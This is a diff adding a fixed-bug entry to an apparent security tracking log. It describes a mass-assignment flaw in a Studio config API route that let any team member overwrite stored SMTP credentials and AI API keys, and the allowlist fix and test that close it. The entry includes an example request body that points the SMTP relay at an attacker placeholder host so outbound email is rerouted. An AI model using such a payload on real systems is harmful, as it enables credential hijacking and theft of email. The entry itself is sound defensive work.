@@ -2190,6 +2190,41 @@ verify the `Deploy to Oracle VMs` run succeeds after merge.
   new), `tsc --noEmit` clean (same pre-existing, unrelated
   `browser-engine.ts` failure noted above).
 
+- **OPEN-183 (Fixed):** shared-credential mass-assignment via `POST
+  /api/studio/config` (`apps/web/src/app/api/studio/config/route.ts`).
+  `Team.aiConfig` is a single shared JSON blob that, per the route's own
+  pre-existing comment, also stores the team's `smtpConfig` (SMTP relay
+  host/port/user/password used to send all outbound campaign email) and AI
+  provider API keys — set during `/setup` and read by
+  `smtpConfigService.ts`. The handler merged the raw, unfiltered request
+  body straight into that blob: `aiConfig: { ...currentAiConfig, ...body }`
+  — no field allowlist, and (unlike every sibling `apps/web/src/app/api/
+  settings/*` route) no `checkTeamPermission`/`authorizePermission` gate at
+  all, only requiring an active team membership of any role. Any team
+  member — including a `viewer`-role member who should only be adjusting
+  Studio tone preferences (`formality`/`directness`/`talkingPoints`/
+  `avoidWords`) — could `POST { smtpConfig: { host: "smtp.attacker.example",
+  user: "attacker@evil.com", password: "hijacked" } }` and silently
+  overwrite the team's real SMTP relay (`smtpConfigService.ts`'s
+  `decryptSecret` even accepts a plain string as an already-decrypted
+  secret, so no valid AES-GCM ciphertext is required), rerouting/
+  exfiltrating all subsequent outbound campaign email, or similarly
+  overwrite the stored AI provider API key. **Fixed** with the minimal
+  change — added a `STUDIO_PATCHABLE_FIELDS` allowlist
+  (`formality`/`directness`/`talkingPoints`/`avoidWords`) and
+  `pickPatchableFields()`, matching the OPEN-179/180/181 pattern, so only
+  those four fields can ever reach the `aiConfig` merge; `smtpConfig`,
+  `apiKey`, and any other key in `currentAiConfig` are preserved but never
+  overwritable from the request body. Deliberately did not add a role gate
+  — editing tone/style preferences is intended to be available to any team
+  member, and the allowlist alone fully closes the credential-hijack
+  vector regardless of role. Extended the existing
+  `apps/web/src/app/api/studio/config/route.test.ts` (which already
+  asserted `smtpConfig`/`apiKey` survive a legitimate save) with a new test
+  asserting a caller-supplied `smtpConfig`/`apiKey` in the body is stripped
+  rather than written through. Full apps/web suite (364 tests, 1 new)
+  passes, `tsc --noEmit` clean.
+
 **Last Reconciled:** 2026-08-23 (**Session-wide production bug-hunting campaign 2026-08-21/23**: triggered by discovering the `/admin/audit` auth bug, which led to systematically re-checking every apps/api and apps/web route for the same bug classes — see OPEN-56 through OPEN-60 below. All fixed and merged/deployed except the manual PAT rotation owed to the user.)
 
 ---
